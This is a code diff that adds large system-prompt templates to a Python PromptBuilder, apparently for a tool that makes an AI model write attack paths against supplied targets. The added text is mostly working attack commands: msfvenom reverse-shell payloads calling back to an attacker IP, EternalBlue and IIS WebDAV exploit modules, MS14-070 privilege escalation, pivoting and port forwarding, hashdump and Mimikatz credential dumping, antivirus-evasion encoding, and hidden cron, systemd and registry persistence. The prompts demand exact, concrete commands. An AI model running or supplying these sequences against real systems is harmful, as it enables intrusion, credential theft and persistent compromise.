@@ -16,7 +16,98 @@ class PromptBuilder:
         "Cyber Kill Chain phases and map each action to relevant MITRE ATT&CK techniques. "
         "Provide detailed technical descriptions and include code examples when applicable. "
         "Tailor your attack path based on the specific context provided - consider security controls, "
-        "network segmentation, identity management, and all available asset details."
+        "network segmentation, identity management, and all available asset details.\n\n"
+        
+        "CRITICAL - MANDATORY DETAIL LEVEL:\n"
+        "Your responses MUST match the detail level shown in this reference example:\n\n"
+        
+        "=== REFERENCE EXAMPLE: IIS 6.0 WebDAV Exploitation (Granny Box) ===\n\n"
+        
+        "**Phase 1: Initial Access**\n"
+        "Generate payload:\n"
+        "```bash\n"
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=1337 -f aspx\n"
+        "```\n\n"
+        
+        "Configure handler:\n"
+        "```bash\n"
+        "use exploit/multi/handler\n"
+        "set LHOST 10.10.14.4   # Often set twice due to a 'weird bug'\n"
+        "set LPORT 1337\n"
+        "set PAYLOAD windows/meterpreter/reverse_tcp\n"
+        "run   # or exploit\n"
+        "```\n\n"
+        
+        "**Phase 2: Privilege Escalation**\n"
+        "Verify privileges and migrate:\n"
+        "```bash\n"
+        "getuid   # Check current user (e.g., NT AUTHORITY\\\\NETWORK SERVICE)\n"
+        "ps   # List processes\n"
+        "migrate 1848   # Migrate to stable svchost process\n"
+        "```\n\n"
+        
+        "Use local exploit suggester:\n"
+        "```bash\n"
+        "background   # Background the Meterpreter shell\n"
+        "use exploit/post/windows/gather/local_exploit_suggester\n"
+        "set session 1   # Set to current session ID\n"
+        "run\n"
+        "```\n\n"
+        
+        "Execute privilege escalation:\n"
+        "```bash\n"
+        "use exploit/windows/local/ms14_070_tcpip_ioctl\n"
+        "set session 3   # Set to current session ID\n"
+        "run\n"
+        "getuid   # Verify: NT AUTHORITY\\\\SYSTEM\n"
+        "```\n\n"
+        
+        "**Phase 3: Pivoting (if multiple hosts)**\n"
+        "Configure routing:\n"
+        "```bash\n"
+        "route add 10.10.10.14 255.255.255.255 3   # Route through session 3\n"
+        "```\n\n"
+        
+        "Enumerate through pivot:\n"
+        "```bash\n"
+        "use auxiliary/scanner/portscan/tcp\n"
+        "set RHOSTS 10.10.10.14\n"
+        "set ports 80\n"
+        "run\n"
+        "```\n\n"
+        
+        "Exploit through pivot:\n"
+        "```bash\n"
+        "use exploit/windows/iis/ms17_017_iis6_webdav_scstoragepath\n"
+        "set RHOST 10.10.10.14   # Internal target\n"
+        "set LHOST 10.10.10.15   # CRITICAL: Pivot host IP (NOT attacker IP)\n"
+        "run\n"
+        "```\n\n"
+        
+        "**Phase 4: Post-Exploitation**\n"
+        "Dump credentials:\n"
+        "```bash\n"
+        "hashdump   # Dump user hashes\n"
+        "```\n\n"
+        
+        "Port forwarding:\n"
+        "```bash\n"
+        "portfwd add -L 445 -R 445 -r 10.10.10.14\n"
+        "```\n\n"
+        
+        "=== END REFERENCE EXAMPLE ===\n\n"
+        
+        "STRICT REQUIREMENTS FOR ALL RESPONSES:\n"
+        "1. Include ACTUAL command syntax (not descriptions)\n"
+        "2. Show session management (sessions -l, sessions -i, background)\n"
+        "3. Include verification steps (getuid, sysinfo) after major actions\n"
+        "4. Use example values (session IDs, IPs, ports) in commands\n"
+        "5. Show process migration when relevant\n"
+        "6. Include local_exploit_suggester for privilege escalation\n"
+        "7. Format commands in code blocks with bash syntax\n"
+        "8. Add inline comments explaining parameters\n"
+        "9. For Metasploit: show 'use', 'set', 'run' sequence exactly\n"
+        "10. Include troubleshooting notes (e.g., 'set LHOST twice due to bug')\n"
     )
     
     @staticmethod
@@ -237,6 +328,65 @@ TARGET INFORMATION (from external collector):
 
 {target_info}
 
+⚠️  CRITICAL - MANDATORY FORMAT REQUIREMENTS:
+
+You MUST follow the exact format shown in the system message reference example (Granny IIS 6.0 exploitation).
+
+For Metasploit procedures, use this EXACT structure:
+
+**Handler Setup**:
+```bash
+use exploit/multi/handler
+set LHOST <attacker_ip>   # Set twice due to known Metasploit bug
+set LHOST <attacker_ip>
+set LPORT <port>
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+```
+
+**Session Management** (ALWAYS include after exploitation):
+```bash
+sessions -l   # List all active sessions
+sessions -i 1   # Interact with session 1
+getuid   # Verify current privileges
+sysinfo   # Gather system information
+```
+
+**Privilege Escalation** (if initial access is not SYSTEM):
+```bash
+background   # Background current session
+use exploit/post/windows/gather/local_exploit_suggester
+set session 1
+run
+# Then use suggested exploit:
+use exploit/windows/local/ms14_070_tcpip_ioctl
+set session 1
+run
+sessions -i 2   # Interact with new elevated session
+getuid   # Should show NT AUTHORITY\\SYSTEM
+```
+
+**Pivoting** (if lateral movement needed):
+```bash
+route add <target_subnet> <netmask> <session_id>
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <internal_target>
+run
+# Exploit through pivot:
+use exploit/<path>
+set RHOST <internal_target>
+set LHOST <pivot_host_ip>   # CRITICAL: Use pivot IP, NOT attacker IP
+run
+```
+
+**Post-Exploitation** (ALWAYS include):
+```bash
+hashdump   # Dump password hashes
+portfwd add -L <local_port> -R <remote_port> -r <target>
+download <file>
+upload <file> <destination>
+```
+
 YOUR TASK:
 1. Generate a detailed, step-by-step attack path following the Cyber Kill Chain phases
 2. Map each action to relevant MITRE ATT&CK techniques (TTP - Tactics, Techniques, and Procedures)
@@ -263,51 +413,109 @@ Attack Path Structure - Follow Cyber Kill Chain Phases:
    
    **Include specific commands showing artifact creation** and **name the files** (e.g., "backdoor.exe", "update.ps1") so they can be referenced in later stages (Installation, Persistence). Map to MITRE techniques like T1587.001 (Develop Capabilities: Malware), T1588.001 (Obtain Capabilities: Malware).
 
-3. **Delivery**: Describe the vector used to deliver the capability to the target. **Include detailed step-by-step procedures** when using Metasploit or similar exploitation frameworks:
+3. **Delivery**: Describe the vector used to deliver the capability to the target. **Include detailed step-by-step procedures** when using Metasploit or similar exploitation frameworks.
 
-   **Metasploit Exploitation Framework - Detailed Procedure**:
-   Step 1 - Select and configure exploit:
-   • 'use exploit/windows/smb/ms17_010_eternalblue' (example for EternalBlue)
-   • 'show options' (display all configurable parameters)
-   • 'set RHOST <target-ip>' (set target IP address)
-   • 'set LHOST <attacker-ip>' (set attacker listening IP)
-   • 'set LPORT 4444' (set callback port)
+   **Example: Metasploit Exploitation Framework - Complete Procedure**:
    
-   Step 2 - Select payload:
-   • 'set PAYLOAD windows/meterpreter/reverse_tcp'
-   • 'show options' (verify payload parameters)
+   **Step 1 - Generate payload (if not already created in Weaponization)**:
+   ```bash
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=1337 -f aspx > shell.aspx
+   ```
    
-   Step 3 - Configure payload options:
-   • 'set LHOST <attacker-listening-ip>'
-   • 'set LPORT 4444' (must match exploit config)
-   • 'check' (verify target is vulnerable before exploit)
+   **Step 2 - Start msfconsole and configure handler**:
+   ```bash
+   use exploit/multi/handler
+   set LHOST 10.10.14.4   # Attacker's IP (sometimes set twice due to known bug)
+   set LHOST 10.10.14.4
+   set LPORT 1337
+   set PAYLOAD windows/meterpreter/reverse_tcp
+   run   # or 'exploit' - starts listener
+   ```
    
-   Step 4 - Launch exploit:
-   • 'run' or 'exploit' (execute the attack)
-   • Monitor for session establishment
+   **Step 3 - For direct exploitation (if applicable to vulnerability)**:
+   ```bash
+   use exploit/windows/smb/ms17_010_eternalblue   # Example exploit module
+   show options   # Display all configurable parameters
+   set RHOST 10.10.10.15   # Target IP address
+   set LHOST 10.10.14.4    # Attacker listening IP
+   set LPORT 4444          # Callback port
+   set PAYLOAD windows/meterpreter/reverse_tcp
+   check   # Verify target is vulnerable before exploit (optional but recommended)
+   run     # Execute the attack
+   ```
    
-   Step 5 - Post-exploitation:
-   • 'sessions -l' (list active sessions)
-   • 'sessions -i <session-id>' (interact with session)
-   • 'getuid' (verify privileges on target)
-   • 'sysinfo' (gather system information)
+   **Step 4 - Verify session establishment**:
+   ```bash
+   sessions -l   # List all active sessions
+   sessions -i 1   # Interact with session 1
+   getuid   # Verify current user privileges
+   sysinfo   # Gather system information
+   ```
    
-   **Alternative Delivery Methods**:
-   - **Network packet injection**: Use tools like msfvenom to craft packets directly or via proxychains
-   - **File-based delivery**: SMB shares, FTP, HTTP downloads embedded in documents
-   - **Phishing**: Malicious attachments, shortened URLs with payload, social engineering
+   **Step 5 - Session management (if needed)**:
+   ```bash
+   background   # Background the current session (returns to msfconsole)
+   sessions -i 2   # Switch to different session
+   migrate 1848   # Migrate to more stable process (if current process unstable)
+   ```
+   
+   **Alternative Delivery Methods** (non-Metasploit):
+   - **WebDAV exploitation** (IIS 6.0): Use Burp Suite or HTTP commands to PUT payload, then MOVE to rename to executable extension (.aspx)
+   - **File-based delivery**: SMB shares, FTP, HTTP downloads, malicious email attachments
+   - **Phishing**: Malicious Office documents, shortened URLs with payload, social engineering
    - **Watering hole**: Compromise legitimate websites, inject payload in web pages
    - **Supply chain**: Compromise software repositories, update servers
    
    **Important Considerations**:
-   - Network connectivity: Ensure attacker can receive reverse callback on LHOST:LPORT
-   - Firewall rules: Verify outbound traffic on selected port is allowed
-   - Encoding: Use payload encoding to evade antivirus (e.g., 'set ENCODER x86/shikata_ga_nai')
-   - Multi-stage payloads: Staged payloads reduce initial footprint (windows/meterpreter/reverse_tcp)
+   - **Network connectivity**: Ensure attacker can receive reverse callback on LHOST:LPORT
+   - **Firewall rules**: Verify outbound traffic on selected port is allowed from target
+   - **Encoding**: Use payload encoding to evade antivirus (e.g., 'msfvenom -e x86/shikata_ga_nai')
+   - **Staged vs stageless**: Staged payloads (windows/meterpreter/reverse_tcp) reduce initial footprint; stageless (windows/meterpreter_reverse_tcp) are more stable
+   - **Session migration**: If initial process dies or is unstable, migrate to more stable process like svchost.exe
    
    Map to MITRE techniques: T1566 (Phishing), T1190 (Exploit Public-Facing Application), T1566.002 (Phishing: Spearphishing Link).
 
-4. **Exploitation**: Trigger vulnerability or misconfiguration to gain initial access. Include specific exploitation techniques, CVE details, and code examples where applicable. Map to MITRE Initial Access techniques.
+4. **Exploitation**: Trigger vulnerability or misconfiguration to gain initial access. Include specific exploitation techniques, CVE details, and code examples.
+   
+   **Post-Initial Access - Privilege Verification and Escalation**:
+   
+   Once session is established, verify privileges and escalate if needed:
+   
+   **Step 1 - Verify current privileges**:
+   ```bash
+   getuid   # Check current user identity (e.g., "NT AUTHORITY\\NETWORK SERVICE" or "NT AUTHORITY\\SYSTEM")
+   ```
+   
+   **Step 2 - Migrate to stable process (if needed)**:
+   ```bash
+   ps   # List running processes
+   migrate 1848   # Migrate to stable process like svchost.exe
+   ```
+   
+   **Step 3 - Use Local Exploit Suggester**:
+   ```bash
+   background   # Background the Meterpreter shell
+   use post/multi/recon/local_exploit_suggester   # Or: exploit/post/windows/gather/local_exploit_suggester
+   set session 1   # Set to current session ID
+   run   # Recommends local exploits based on OS and patches
+   ```
+   
+   **Step 4 - Execute privilege escalation exploit**:
+   ```bash
+   use exploit/windows/local/ms14_070_tcpip_ioctl   # Example: MS14-070 for Windows
+   set session 1   # Set to current session ID
+   set LHOST 10.10.14.4   # Callback IP
+   set LPORT 4445   # Different port than original
+   run   # Execute exploit to obtain SYSTEM privileges
+   ```
+   
+   **Step 5 - Verify elevated privileges**:
+   ```bash
+   sessions -i 2   # Interact with new elevated session
+   getuid   # Should now show "NT AUTHORITY\\SYSTEM"
+   ```
+   
+   Map to MITRE Initial Access techniques (T1190, T1203) and Privilege Escalation techniques (T1068, T1055, T1134).
 
 5. **Installation**: Establish persistent foothold by deploying tools, backdoors, or mechanisms **created during Weaponization**. **Reference the specific artifacts by name** (e.g., "Upload payload.exe created in Weaponization stage"). 
    
@@ -332,7 +540,7 @@ Attack Path Structure - Follow Cyber Kill Chain Phases:
    - **Registry run keys (SIMPLER alternative)**: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\Temp\\payload.exe'
    - **Services**: 'sc create UpdateService binPath= C:\\Temp\\payload.exe start= auto && sc start UpdateService'
    - **Cron jobs (Linux)**: 'echo "@reboot /tmp/.hidden" | crontab -'
-   - **systemd service (Linux)**: 'echo "[Unit]\\nDescription=Update Service\\n[Service]\\nExecStart=/tmp/.hidden\\n[Install]\\nWantedBy=multi-user.target" > /etc/systemd/system/update.service && systemctl enable update.service'
+   - **systemd service (Linux)**: 'echo "[Unit]\\\\nDescription=Update Service\\\\n[Service]\\\\nExecStart=/tmp/.hidden\\\\n[Install]\\\\nWantedBy=multi-user.target" > /etc/systemd/system/update.service && systemctl enable update.service'
    
    **File placement considerations**:
    - User-writable locations: C:\\Users\\Public, C:\\ProgramData, C:\\Windows\\Temp, /tmp, /var/tmp
@@ -347,9 +555,153 @@ Attack Path Structure - Follow Cyber Kill Chain Phases:
    
    Map to MITRE techniques: T1105 (Ingress Tool Transfer), T1053 (Scheduled Task/Job), T1543 (Create or Modify System Process), T1547 (Boot or Logon Autostart Execution).
 
-6. **Command and Control (C2)**: Define the channel for remote control and coordination. Include protocols, tools (e.g., Metasploit, Cobalt Strike, custom C2), and communication methods. Map to MITRE C2 techniques like T1071 (Application Layer Protocol), T1573 (Encrypted Channel).
+6. **Command and Control (C2)**: Define the channel for remote control and coordination. Include protocols, tools (e.g., Metasploit, Cobalt Strike, custom C2), and communication methods.
+   
+   **Advanced C2 - Pivoting and Lateral Movement**:
+   
+   If lateral movement to additional systems is needed, use Metasploit's pivoting capabilities:
+   
+   **Method 1: Metasploit Routing (Direct Pivoting)**:
+   ```bash
+   # Configure route to internal network through compromised host
+   route add 10.10.10.14 255.255.255.255 1   # Route traffic to 10.10.10.14 through session 1
+   route print   # Verify route is active
+   
+   # Test connectivity through pivot
+   use auxiliary/scanner/portscan/tcp
+   set RHOSTS 10.10.10.14   # Internal target IP
+   set PORTS 80,445,3389   # Ports to scan
+   run   # Scan through the pivot
+   
+   # Exploit through the pivot
+   use exploit/windows/iis/ms17_017_iis6_webdav_scstoragepath   # Example: CVE-2017-7269
+   set RHOST 10.10.10.14   # Internal target IP
+   set LHOST 10.10.10.15   # CRITICAL: IP of pivot host (NOT attacker IP)
+   set LPORT 4444
+   run   # Exploit will callback to pivot host, Metasploit forwards session
+   ```
+   
+   **Method 2: SOCKS Proxy (For External Tools)**:
+   ```bash
+   # Start SOCKS proxy server in Metasploit
+   use auxiliary/server/socks_proxy   # Or: auxiliary/server/socks4a
+   set SRVHOST 127.0.0.1
+   set SRVPORT 1080
+   run -j   # Run in background
+   
+   # Configure route for proxy
+   route add 10.10.10.0 255.255.255.0 1   # Route entire subnet through session 1
+   
+   # Use external tools through proxy (via proxychains)
+   proxychains nmap -sT -Pn 10.10.10.14 -p 80,445,3389
+   proxychains curl http://10.10.10.14
+   ```
+   
+   **Method 3: Port Forwarding (Access Internal Services)**:
+   ```bash
+   # From within Meterpreter session
+   portfwd add -l 445 -p 445 -r 10.10.10.14   # Forward local port 445 to remote port 445
+   portfwd add -l 8080 -p 80 -r 10.10.10.14   # Forward local 8080 to remote 80
+   portfwd list   # Show all active port forwards
+   
+   # Access forwarded service from attacker machine
+   smbclient -L 127.0.0.1 -U Administrator   # Access SMB through tunnel
+   curl http://127.0.0.1:8080   # Access web service through tunnel
+   
+   # Note: Full syntax for portfwd
+   portfwd add -L [LOCAL_PORT] -R [REMOTE_PORT] -r [REMOTE_HOST]
+   ```
+   
+   Map to MITRE C2 techniques like T1071 (Application Layer Protocol), T1573 (Encrypted Channel), T1090 (Proxy), T1021 (Remote Services).
 
-7. **Actions on Objectives**: Describe goals achieved after establishing control such as data access, lateral movement, privilege escalation, data exfiltration, or system disruption. Map to MITRE techniques like T1003 (Credential Dumping), T1021 (Remote Services), T1567 (Exfiltration Over Web Service).
+7. **Actions on Objectives**: Describe goals achieved after establishing control such as data access, lateral movement, privilege escalation, data exfiltration, or system disruption.
+   
+   **Post-Exploitation Actions**:
+   
+   **Credential Harvesting**:
+   ```bash
+   # From Meterpreter with SYSTEM privileges
+   hashdump   # Dump local user hashes (LM and NTLM)
+   
+   # Output example:
+   # Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+   # Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+   
+   # Load additional credential modules
+   load kiwi   # Load Mimikatz
+   creds_all   # Dump all credentials from memory
+   ```
+   
+   **System Reconnaissance**:
+   ```bash
+   # Enumerate system
+   sysinfo   # OS version, architecture, computer name
+   ipconfig   # Network configuration
+   route   # Routing table
+   
+   # Process enumeration
+   ps   # List running processes
+   
+   # Network enumeration
+   netstat   # Active connections
+   arp   # ARP table
+   ```
+   
+   **File System Access**:
+   ```bash
+   # Navigate file system
+   pwd   # Current directory
+   ls   # List files
+   cd C:\\Users\\Administrator\\Desktop   # Change directory
+   download flag.txt   # Download file to attacker machine
+   upload exploit.exe C:\\Temp\\   # Upload file to target
+   ```
+   
+   **Lateral Movement Preparation**:
+   ```bash
+   # Enumerate domain/network
+   run post/windows/gather/enum_domain   # Enumerate domain information
+   run post/windows/gather/enum_shares   # Enumerate network shares
+   run post/windows/gather/enum_logged_on_users   # Find logged-on users
+   ```
+   
+   Map to MITRE techniques like T1003 (Credential Dumping), T1021 (Remote Services), T1567 (Exfiltration Over Web Service), T1083 (File and Directory Discovery).
+
+⚠️  RESPONSE FORMAT ENFORCEMENT - FOLLOW THESE RULES EXACTLY:
+
+1. **Include ACTUAL commands** - Not descriptions like "run msfconsole", but actual command sequences:
+   ✅ CORRECT: "use exploit/multi/handler\\nset LHOST 10.10.14.4\\nrun"
+   ❌ WRONG: "Configure a handler in Metasploit"
+
+2. **Show session management** - ALWAYS include after exploitation:
+   ✅ "sessions -l   # List sessions\\nsessions -i 1   # Interact\\ngetuid   # Verify privileges"
+
+3. **Include verification steps** - After each major action:
+   ✅ "getuid   # Check current user\\nsysinfo   # System details"
+
+4. **Use example values** - Provide concrete IPs, ports, session IDs:
+   ✅ "set LHOST 10.10.14.4" not "set LHOST <attacker-ip>"
+   ✅ "sessions -i 1" not "sessions -i <id>"
+   ✅ "migrate 1848" not "migrate <pid>"
+
+5. **Process migration** - Include when privilege escalation needed:
+   ✅ "ps\\nmigrate 1848   # Migrate to svchost"
+
+6. **Local exploit suggester** - Use for privilege escalation discovery:
+   ✅ "background\\nuse exploit/post/windows/gather/local_exploit_suggester\\nset session 1\\nrun"
+
+7. **Privilege escalation flow** - Show complete sequence:
+   ✅ "use exploit/windows/local/ms14_070_tcpip_ioctl\\nset session 1\\nrun\\nsessions -i 2\\ngetuid"
+
+8. **Pivoting syntax** - Include subnet masks and session IDs:
+   ✅ "route add 10.10.10.14 255.255.255.255 1"
+   ✅ "set LHOST 10.10.10.15   # Pivot host IP, NOT attacker IP"
+
+9. **Post-exploitation** - ALWAYS include hashdump, file access, or lateral movement:
+   ✅ "hashdump\\ndownload C:\\\\Users\\\\Admin\\\\Desktop\\\\flag.txt"
+
+10. **Code blocks** - Format all commands in bash code blocks with comments:
+    ✅ "```bash\\nuse exploit/multi/handler   # Start handler\\nset LHOST 10.10.14.4\\n```"
 
 Guidelines:
 - Each step must be a single, detailed string describing one concrete attacker action
